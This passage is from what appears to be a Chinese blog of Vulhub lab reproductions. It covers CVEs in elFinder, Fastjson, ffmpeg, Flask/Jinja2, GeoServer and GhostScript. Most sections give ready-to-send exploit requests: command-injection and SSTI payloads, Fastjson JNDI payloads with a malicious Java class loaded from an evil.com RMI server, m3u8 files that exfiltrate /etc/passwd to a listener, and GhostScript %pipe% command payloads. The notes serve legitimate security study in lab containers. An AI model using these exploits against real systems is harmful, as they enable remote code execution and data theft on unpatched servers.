href="https://electronjs.org/blog/web-preferences-fix">https://electronjs.org/blog/web-preferences-fix</a></li><li><a href="https://www.contrastsecurity.com/security-influencers/cve-2018-15685">https://www.contrastsecurity.com/security-influencers/cve-2018-15685</a></li></ul></blockquote><p>报错 .sh无法执行</p><h1 id="electron-远程命令执行漏洞（CVE-2018-1000006）（未完成）"><a href="#electron-远程命令执行漏洞（CVE-2018-1000006）（未完成）" class="headerlink" title="electron 远程命令执行漏洞（CVE-2018-1000006）（未完成）"></a>electron 远程命令执行漏洞（CVE-2018-1000006）（未完成）</h1><p>同上</p><h1 id="elFinder-ZIP-参数与任意命令注入（CVE-2021-32682）"><a href="#elFinder-ZIP-参数与任意命令注入（CVE-2021-32682）" class="headerlink" title="elFinder ZIP 参数与任意命令注入（CVE-2021-32682）"></a>elFinder ZIP 参数与任意命令注入（CVE-2021-32682）</h1><p>elFinder是一个基于PHP、Jquery的开源文件管理系统。</p><p>在elFinder 2.1.48及以前的版本中，存在一处参数注入漏洞。攻击者可以利用这个漏洞在目标服务器上执行任意命令，即使是最小化安装的elFinder。</p><p>这个漏洞的原因除了参数注入外，还有默认情况下的未授权访问，因此我们可以对elFinder增加权限校验，避免任意用户操作服务器上的文件，进而避免被执行任意命令。当然，升级版本到2.1.49及以上也是必要的。</p><p>参考链接：</p><ul><li><a href="https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities">https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities</a></li><li><a href="https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt">https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt</a></li><li><a href="https://xz.aliyun.com/t/10739">https://xz.aliyun.com/t/10739</a></li></ul><h2 id="漏洞复现-50"><a href="#漏洞复现-50" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 复现这个漏洞首先需要用elFinder提供的功能，创建两个文件。</p><p>先创建一个普通的文本文件<code>1.txt</code>：</p><p>然后右键这个文件，对其进行打包，打包后的文件命名为<code>2.zip</code>：</p><p>最后我们获得<code>1.txt</code>和<code>2.zip</code>两个文件：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/108.jpg" alt="108"></p><blockquote><p>然后，发送如下数据包来执行任意命令：</p><pre class="line-numbers language-none"><code class="language-none">GET /php/connector.minimal.php?cmd=archive&amp;name=-TvTT=id&gt;shell.php%20%23%20a.zip&amp;target=l1_Lw&amp;targets%5B1%5D=l1_Mi56aXA&amp;targets%5B0%5D=l1_MS50eHQ&amp;type=application%2Fzip HTTP/1.1Host: your-ipAccept: application/json, text/javascript, */*; q=0.01User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36X-Requested-With: XMLHttpRequestReferer: http://localhost.lan:8080/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个数据包中，你可以看到三个重要的参数：</p><ul><li><code>name</code>， 值为<code>-TvTT=id&gt;shell.php # a.zip</code>，你可以修改<code>id&gt;shell.php</code>为任意你想执行的命令</li><li><code>targets[0]</code>， 值为<code>l1_MS50eHQ</code>，<code>l1</code>意思是第一个文件系统（默认值，不用修改），<code>MS50eHQ</code>是<code>1.txt</code>的base64编码</li><li><code>targets[1]</code>， 值为<code>l1_Mi56aXA</code>，<code>l1</code>意思是第一个文件系统（默认值，不用修改），<code>Mi56aXA</code>是<code>2.zip</code>的base64编码</li></ul><p>虽然这个数据包发送后会返回错误信息，但实际上其中指定的命令已经被成功执行</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/109.jpg" alt="109"></p><blockquote><p>可以访问<code>http://your-ip:8080/files/shell.php</code>查看执行的结果：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/110.jpg" alt="110"></p><h1 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞</h1><blockquote><p> fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p>参考资料：</p><ul><li><a href="https://www.freebuf.com/vuls/208339.html">https://www.freebuf.com/vuls/208339.html</a></li><li><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></li></ul></blockquote><h2 id="漏洞复现-51"><a href="#漏洞复现-51" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p><p>首先编译并上传命令执行代码，如<code>http://evil.com/TouchFile.class</code>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {"touch", "/tmp/success"};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>向靶场服务器发送Payload，带上RMI的地址：</p><pre class="line-numbers language-none"><code class="language-none">POST / HTTP/1.1Host: your-ip:8090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 160{    "b":{        "@type":"com.sun.rowset.JdbcRowSetImpl",        "dataSourceName":"rmi://evil.com:9999/TouchFile",        "autoCommit":true    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，命令<code>touch /tmp/success</code>已成功执行：</p></blockquote><p>我参考了<a href="https://blog.csdn.net/BrickLoveStudy/article/details/124362374">这个教程</a></p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/112.jpg" alt="112"></p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/113.jpg" alt="113"></p><h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><blockquote><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955">https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955</a></li><li><a href="https://www.freebuf.com/vuls/208339.html">https://www.freebuf.com/vuls/208339.html</a></li></ul></blockquote><h2 id="漏洞复现-52"><a href="#漏洞复现-52" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>和上面那个过程完全一样啊 就不再搞一遍了</p><blockquote><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p><p>首先编译并上传命令执行代码，如<code>http://evil.com/TouchFile.class</code>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {"touch", "/tmp/success"};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>向靶场服务器发送Payload：</p><pre class="line-numbers language-none"><code class="language-none">{    "a":{        "@type":"java.lang.Class",        "val":"com.sun.rowset.JdbcRowSetImpl"    },    "b":{        "@type":"com.sun.rowset.JdbcRowSetImpl",        "dataSourceName":"rmi://evil.com:9999/Exploit",        "autoCommit":true    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，命令<code>touch /tmp/success</code>已成功执行：</p></blockquote><h1 id="ffmpeg-任意文件读取漏洞-SSRF漏洞-（CVE-2016-1897-CVE-2016-1898）"><a href="#ffmpeg-任意文件读取漏洞-SSRF漏洞-（CVE-2016-1897-CVE-2016-1898）" class="headerlink" title="ffmpeg 任意文件读取漏洞/SSRF漏洞 （CVE-2016-1897/CVE-2016-1898）"></a>ffmpeg 任意文件读取漏洞/SSRF漏洞 （CVE-2016-1897/CVE-2016-1898）</h1><blockquote><p>运行环境：</p><pre class="line-numbers language-none"><code class="language-none">docker compose builddocker compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><ul><li><a href="http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li><li><a href="http://blog.neargle.com/SecNewsBak/drops/CVE-2016-1897.8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">http://blog.neargle.com/SecNewsBak/drops/CVE-2016-1897.8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></li><li><a href="http://habrahabr.ru/company/mailru/blog/274855/">http://habrahabr.ru/company/mailru/blog/274855/</a></li></ul><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p>详见参考文章，不再赘述。</p></blockquote><h2 id="漏洞复现-53"><a href="#漏洞复现-53" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>三个链接死了两个 这里用的是[这个教程][<a href="https://www.freebuf.com/articles/web/258320.html]">https://www.freebuf.com/articles/web/258320.html]</a></p><blockquote><p>首先，我们需要在 web 服务器上创建一个 back.txt，文件内容是 m3u8 的格式，其中不包含文件结束符。<br>其次，我们再创建一个恶意的 m3u8 文件，文件内容通过 concat 拼接本地文件/etc/passwd。<br>最后，我们上传这个恶意的 m3u8 文件。<br>back.txt：</p><pre class="line-numbers language-none"><code class="language-none">#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:,http://your_ip:9999/?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>upload.m3u8:</p><pre class="line-numbers language-none"><code class="language-none">#EXTM3U#EXT-X-TARGETDURATION:6#EXTINF:10.0,concat:http://your_ip/back.txt|file:///etc/passwd#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Tip: 以上的文件需要使用记事本编辑保存，选择默认 utf-8 格式。使用vim来编译可能会导致复现失败。</p><p>使用python来搭建一个简易的web，将back.txt部署到web上。</p><pre class="line-numbers language-none"><code class="language-none">python2 -m SimpleHTTPServer 8888或python3 -m http.server 8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上传恶意m3u8文件，并监听9999端口</p><p>感谢师傅不断测试扫坑：<a href="https://www.freebuf.com/articles/web/258320.html">https://www.freebuf.com/articles/web/258320.html</a>.<br>以下均来自上面师傅的文章<br>在不断测试的过程中，最终发现，与 URL 长度，m3u8 请求 URL 都无关系，也没有 32 字节的限制。实际上 concat 连接 URL 时是不能包含换行符的。/etc/passwd 文件存储过程中换行符 \n 是占一个字符的，所以无论是通过 file 协议，还是 subfile 切片，只要是读取到 \n 则中断，后面的内容无法输出。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/114.jpg" alt="114"></p><h1 id="ffmpeg-任意文件读取漏洞环境"><a href="#ffmpeg-任意文件读取漏洞环境" class="headerlink" title="ffmpeg 任意文件读取漏洞环境"></a>ffmpeg 任意文件读取漏洞环境</h1><blockquote><p>参考资料：</p><ul><li><a href="http://bobao.360.cn/learning/detail/4032.html">http://bobao.360.cn/learning/detail/4032.html</a></li><li><a href="https://hackerone.com/reports/242831">https://hackerone.com/reports/242831</a></li><li><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin">https://github.com/neex/ffmpeg-avi-m3u-xbin</a></li></ul></blockquote><h2 id="漏洞复现-54"><a href="#漏洞复现-54" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 漏洞原理不再赘述，直接下载exp，并生成payload：</p><pre class="line-numbers language-none"><code class="language-none"># 下载expgit clone https://github.com/neex/ffmpeg-avi-m3u-xbincd ffmpeg-avi-m3u-xbin# 生成payload./gen_xbin_avi.py file:///etc/passwd exp.avi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成exp.avi，在<code>http://your-ip:8080/</code>上传。后端将会将你上传的视频用ffmpeg转码后显示，转码时因为ffmpeg的任意文件读取漏洞，可将文件信息读取到视频中：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/115.jpg" alt="115"></p><blockquote><p>你也可以执行<code>docker compose exec web bash</code>进入本环境内部，测试ffmpeg。</p></blockquote><p>注：没法直接播放的话可以右键保存下来看</p><h1 id="Flask（Jinja2）-服务端模板注入漏洞"><a href="#Flask（Jinja2）-服务端模板注入漏洞" class="headerlink" title="Flask（Jinja2） 服务端模板注入漏洞"></a>Flask（Jinja2） 服务端模板注入漏洞</h1><blockquote><h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p>参考文章：</p><ul><li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></li><li><a href="http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates">http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates</a></li></ul></blockquote><h2 id="漏洞复现-55"><a href="#漏洞复现-55" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>编译及运行测试环境：</p><pre class="line-numbers language-none"><code class="language-none">docker compose builddocker compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问<code>http://your-ip/?name={{233*233}}</code>，得到54289，说明SSTI漏洞存在。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/116.jpg" alt="116"></p><blockquote><p>获取eval函数并执行任意python代码的POC：</p><pre class="line-numbers language-none"><code class="language-none">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}  {% for b in c.__init__.__globals__.values() %}  {% if b.__class__ == {}.__class__ %}    {% if 'eval' in b.keys() %}      {{ b['eval']('__import__("os").popen("id").read()') }}    {% endif %}  {% endif %}  {% endfor %}{% endif %}{% endfor %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问<code>http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</code>，得到执行结果：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/117.jpg" alt="117"></p><h1 id="flink的俩漏洞readme没人翻译做个鸡毛啊"><a href="#flink的俩漏洞readme没人翻译做个鸡毛啊" class="headerlink" title="flink的俩漏洞readme没人翻译做个鸡毛啊"></a>flink的俩漏洞readme没人翻译做个鸡毛啊</h1><h1 id="GeoServer-OGC-Filter-SQL注入漏洞（CVE-2023-25157）"><a href="#GeoServer-OGC-Filter-SQL注入漏洞（CVE-2023-25157）" class="headerlink" title="GeoServer OGC Filter SQL注入漏洞（CVE-2023-25157）"></a>GeoServer OGC Filter SQL注入漏洞（CVE-2023-25157）</h1><blockquote><p>GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。</p><p>在版本2.22.1和2.21.4及以前，多个OGC表达式中均存在SQL注入漏洞。</p><p>参考链接：</p><ul><li><a href="https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158">https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158</a></li><li><a href="https://github.com/advisories/GHSA-7g5f-wrx8-5ccf">https://github.com/advisories/GHSA-7g5f-wrx8-5ccf</a></li></ul></blockquote><h2 id="漏洞复现-56"><a href="#漏洞复现-56" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>在利用漏洞前，需要目标服务器中存在类型是PostGIS的数据空间（datastore）和工作空间（workspace）。在Vulhub中，已经包含满足条件的工作空间，其信息如下：</p><ul><li>Workspace name: <code>vulhub</code></li><li>Data store name: <code>pg</code></li><li>Feature type (table) name: <code>example</code></li><li>One of attribute from feature type: <code>name</code></li></ul><p>利用这些已知参数，发送如下URL即可触发SQL注入漏洞：</p><pre class="line-numbers language-none"><code class="language-none">http://your-ip:8080/geoserver/ows?service=wfs&amp;version=1.0.0&amp;request=GetFeature&amp;typeName=vulhub:example&amp;CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/118.jpg" alt="118"></p><p>可见，已经使用SQL注入获取到了目标服务器PostgreSQL的版本。</p><h1 id="GeoServer-属性名表达式前台代码执行漏洞（CVE-2024-36401）"><a href="#GeoServer-属性名表达式前台代码执行漏洞（CVE-2024-36401）" class="headerlink" title="GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）"></a>GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）</h1><blockquote><p>GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。</p><p>在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a></li><li><a href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a></li><li><a href="https://tttang.com/archive/1771/">https://tttang.com/archive/1771/</a></li><li><a href="https://github.com/Warxim/CVE-2022-41852">https://github.com/Warxim/CVE-2022-41852</a></li></ul></blockquote><h2 id="漏洞复现-57"><a href="#漏洞复现-57" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>在官方<a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">漏洞通告</a>中提到可以找到漏洞相关的WFS方法：</p><blockquote><p>No public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests.</p></blockquote><p>比如，我这里使用<code>GetPropertyValue</code>来执行xpath表达式。参考<a href="https://github.com/geoserver/geoserver/blob/2.23.2/doc/en/user/source/services/wfs/reference.rst">官方文档</a>，我构造了两个POC。基于GET方法的POC：</p><pre class="line-numbers language-none"><code class="language-none">GET /geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success1') HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36Connection: closeCache-Control: max-age=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基于POST方法的POC：</p><pre class="line-numbers language-none"><code class="language-none">POST /geoserver/wfs HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/xmlContent-Length: 356&lt;wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:topp='http://www.openplans.org/topp' xmlns:fes='http://www.opengis.net/fes/2.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'&gt;  &lt;wfs:Query typeNames='sf:archsites'/&gt;  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2')&lt;/wfs:valueReference&gt;&lt;/wfs:GetPropertyValue&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><p>熟悉的<code>java.lang.ClassCastException</code>错误，说明命令已执行成功。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/119.jpg"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/120.jpg"></p><blockquote><p>进入容器可见，<code>touch /tmp/success1</code>与<code>touch /tmp/success2</code>均已成功执行。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/121.jpg"></p><blockquote><p> 值得注意的是，typeNames必须存在，我们可以在Web页面中找到当前服务器中的所有Types：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/122.jpg"></p><h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）</h1><blockquote><p>8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 GhostScript 的安全沙箱可以被绕过，通过构造恶意的图片内容，将可以造成命令执行、文件读取、文件删除等漏洞：</p><ul><li><a href="http://seclists.org/oss-sec/2018/q3/142">http://seclists.org/oss-sec/2018/q3/142</a></li><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640</a></li></ul><p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p></blockquote><h2 id="漏洞复现-58"><a href="#漏洞复现-58" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>上传<a href="poc.png">poc.png</a>，将执行命令<code>id &gt; /tmp/success &amp;&amp; cat /tmp/success</code>。此时进入容器<code>docker compose exec web bash</code>，将可以看到/tmp/success已被创建：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/123.jpg" alt="123"></p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/124.jpg" alt="124"></p><blockquote><p>可见，id命令已被成功运行。</p></blockquote><h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）</h1><blockquote><p>2018年底来自Semmle Security Research Team的Man Yue Mo发表了CVE-2018-16509漏洞的变体CVE-2018-19475，可以通过一个恶意图片绕过GhostScript的沙盒，进而在9.26以前版本的gs中执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://blog.semmle.com/ghostscript-CVE-2018-19475/">https://blog.semmle.com/ghostscript-CVE-2018-19475/</a></li><li><a href="https://bugs.ghostscript.com/show_bug.cgi?id=700153">https://bugs.ghostscript.com/show_bug.cgi?id=700153</a></li></ul></blockquote><h2 id="漏洞复现-59"><a href="#漏洞复现-59" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 将POC作为图片上传，执行命令<code>id &gt; /tmp/success &amp;&amp; cat /tmp/success</code>：</p><pre class="line-numbers language-none"><code class="language-none">POST /index.php HTTP/1.1Host: targetAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryukZmnyhOContent-Length: 279------WebKitFormBoundaryukZmnyhOContent-Disposition: form-data; name="file_upload"; filename="1.jpg"content-Type="image/png"%!PS0 1 300367 {} for{save restore} stopped {} if(%pipe%id &gt; /tmp/success &amp;&amp; cat /tmp/success) (w) file------WebKitFormBoundaryukZmnyhO--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>命令已成功执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/125.jpg" alt="125"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/126.jpg" alt="126"></p><blockquote><p>当然，真实环境下通常无法直接回显漏洞执行结果，你需要使用带外攻击的方式来检测漏洞。</p></blockquote><h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h1><blockquote><p>2019年1月23日晚，Artifex官方在ghostscriptf的master分支上提交合并了多达6处的修复。旨在修复 CVE-2019-6116 漏洞，该漏洞由 Google 安全研究员 Tavis 于2018年12月3日提交。该漏洞可以直接绕过 ghostscript 的安全沙箱，导致攻击者可以执行任意命令/读取任意文件。</p><p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 